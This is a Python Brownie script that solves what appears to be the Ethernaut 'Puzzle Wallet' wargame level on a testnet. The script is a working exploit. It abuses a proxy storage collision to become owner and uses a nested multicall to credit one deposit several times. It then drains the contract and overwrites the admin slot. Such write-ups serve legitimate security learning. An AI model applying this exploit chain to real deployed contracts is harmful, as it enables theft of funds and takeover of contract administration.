from brownie import accounts, PuzzleProxy, PuzzleWallet, Contract
from web3 import Web3

eth_amount = Web3.toWei("0.001", "ether")

# load account
account = accounts.load("Rinkeby_Test_Net_Account")

# get instance and setup contract to work with proxy
# we need to use abi of implementation with the proxy address
instance_address = "0xEe4C7236e235E0F3040f09287297CFA40c84EafC"
proxy = PuzzleProxy.at(instance_address)
wallet = Contract.from_abi("PuzzleWallet", instance_address, PuzzleWallet.abi)

# -------------------------------------------
# to pass this level we must become the admin
# -------------------------------------------


def level_completed():
    return proxy.admin() == account.address


def exploit():
    # proposeNewAdmin (this changes owner variable)
    tx = proxy.proposeNewAdmin(account.address, {"from": account})
    tx.wait(1)

    # view owner variable
    print(wallet.owner())

    # add ourselves to whitelist
    tx = wallet.addToWhitelist(account.address, {"from": account})
    tx.wait(1)

    # check that we are whitelisted
    print(wallet.whitelisted(account.address))

    # we need to set maxBalance to our address to become admin (balance must be 0)
    print(f"Balance of the contract: {wallet.balance()}")

    # exploit multicall and give ourselves 3 times the balance of contract
    data_1 = wallet.deposit.signature
    data_2 = wallet.multicall.encode_input([data_1])
    tx = wallet.multicall(
        [data_1, data_2, data_2], {"from": account, "value": eth_amount}
    )
    tx.wait(1)
    print(f"The balance of the contract: {wallet.balance()}")
    print(f"My balance: {wallet.balances(account.address)}")

    # call execute and send balance of contract to ourselves
    tx = wallet.execute(account.address, wallet.balance(), "0x0", {"from": account})
    tx.wait(1)
    print(f"Balance of contract: {wallet.balance()}")

    # call setMaxBalance and give address as argument (this changes the admin variable)
    tx = wallet.setMaxBalance(account.address, {"from": account})
    tx.wait(1)

    # confirm that completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
